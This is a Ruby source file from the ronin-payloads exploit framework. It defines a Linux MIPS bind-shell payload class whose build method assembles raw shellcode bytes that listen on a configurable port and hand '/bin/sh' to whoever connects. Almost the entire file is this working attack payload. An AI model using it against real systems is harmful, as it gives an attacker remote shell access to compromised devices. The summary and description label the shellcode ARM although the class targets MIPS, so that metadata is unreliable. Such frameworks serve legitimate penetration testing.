# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/bind_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module MIPS
          #
          # Linux MIPS shellcode that binds a shell to a port.
          #
          class BindShell < BindShellPayload

            register 'shellcode/linux/mips/bind_shell'

            arch :mips
            os :linux

            author 'vaicebine', email: 'vaicebine@gmail.com'

            summary 'Linux ARM bind shell shellcode'
            description <<~DESC
              Linux ARM shellcode that binds a shell to a port.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-81.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\xe0\xff\xbd\x27" \
                         "\xfd\xff\x0e\x24" \
                         "\x27\x20\xc0\x01" \
                         "\x27\x28\xc0\x01" \
                         "\xff\xff\x06\x28" \
                         "\x57\x10\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "\x50\x73\x0f\x24" \
                         "\xff\xff\x50\x30" \
                         "\xef\xff\x0e\x24" \
                         "\x27\x70\xc0\x01" \
                         "#{packed_port}\x0d\x24" \
                         "\x04\x68\xcd\x01" \
                         "\xff\xfd\x0e\x24" \
                         "\x27\x70\xc0\x01" \
                         "\x25\x68\xae\x01" \
                         "\xe0\xff\xad\xaf" \
                         "\xe4\xff\xa0\xaf" \
                         "\xe8\xff\xa0\xaf" \
                         "\xec\xff\xa0\xaf" \
                         "\x25\x20\x10\x02" \
                         "\xef\xff\x0e\x24" \
                         "\x27\x30\xc0\x01" \
                         "\xe0\xff\xa5\x23" \
                         "\x49\x10\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "\x50\x73\x0f\x24" \
                         "\x25\x20\x10\x02" \
                         "\x01\x01\x05\x24" \
                         "\x4e\x10\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "\x50\x73\x0f\x24" \
                         "\x25\x20\x10\x02" \
                         "\xff\xff\x05\x28" \
                         "\xff\xff\x06\x28" \
                         "\x48\x10\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "\x50\x73\x0f\x24" \
                         "\xff\xff\x50\x30" \
                         "\x25\x20\x10\x02" \
                         "\xfd\xff\x0f\x24" \
                         "\x27\x28\xe0\x01" \
                         "\xdf\x0f\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "\x50\x73\x0f\x24" \
                         "\x25\x20\x10\x02" \
                         "\x01\x01\x05\x28" \
                         "\xdf\x0f\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "\x50\x73\x0f\x24" \
                         "\x25\x20\x10\x02" \
                         "\xff\xff\x05\x28" \
                         "\xdf\x0f\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "\x50\x73\x0f\x24" \
                         "\x50\x73\x06\x24" \
                         "\xff\xff\xd0\x04" \
                         "\x50\x73\x0f\x24" \
                         "\xff\xff\x06\x28" \
                         "\xdb\xff\x0f\x24" \
                         "\x27\x78\xe0\x01" \
                         "\x21\x20\xef\x03" \
                         "\xf0\xff\xa4\xaf" \
                         "\xf4\xff\xa0\xaf" \
                         "\xf0\xff\xa5\x23" \
                         "\xab\x0f\x02\x24" \
                         "\x0c\x01\x01\x01" \
                         "/bin/sh".b
            end

          end
        end
      end
    end
  end
end
